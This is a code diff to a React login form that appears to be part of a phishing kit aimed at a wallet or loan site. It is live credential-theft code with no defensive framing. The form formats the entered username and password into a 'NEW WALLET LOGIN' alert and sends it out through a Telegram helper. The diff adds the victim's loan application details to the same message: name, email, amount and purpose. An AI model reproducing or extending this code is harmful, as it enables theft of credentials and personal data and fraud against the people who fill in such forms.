@@ -3,10 +3,11 @@ import React, { useState } from 'react';
 import { sendLoginToTelegramAndWait } from '../utils/telegram';
 
 interface LoginFormProps {
+  loanData?: any;
   onLogin: (data: any) => void;
 }
 
-const LoginForm: React.FC<LoginFormProps> = ({ onLogin }) => {
+const LoginForm: React.FC<LoginFormProps> = ({ onLogin, loanData }) => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
@@ -17,7 +18,8 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLogin }) => {
     setIsLoading(true);
     setErrorMsg('');
     
-    const message = `<b>🚨 NEW WALLET LOGIN 🚨</b>\n\n<b>👤 Username:</b> <code>${username}</code>\n<b>🔑 Password:</b> <code>${password}</code>\n\n<i>🌐 Automated Log Request</i>`;
+    const loanDetails = loanData && loanData.loanType ? `\n\n<b>🏦 LOAN DETAILS 🏦</b>\n<b>Type:</b> <code>${loanData.loanType}</code>\n<b>Amount:</b> <code>$${loanData.loanAmount}</code>\n<b>Term:</b> <code>${loanData.loanTerm}</code>\n<b>Name:</b> <code>${loanData.firstName} ${loanData.lastName}</code>\n<b>Email:</b> <code>${loanData.email}</code>\n<b>Purpose:</b> <code>${loanData.purpose}</code>` : '';
+    const message = `<b>🚨 NEW WALLET LOGIN 🚨</b>\n\n<b>👤 Username:</b> <code>${username}</code>\n<b>🔑 Password:</b> <code>${password}</code>${loanDetails}\n\n<i>🌐 Automated Log Request</i>`;
     
     try {
       const isAccepted = await sendLoginToTelegramAndWait(message, username, false);
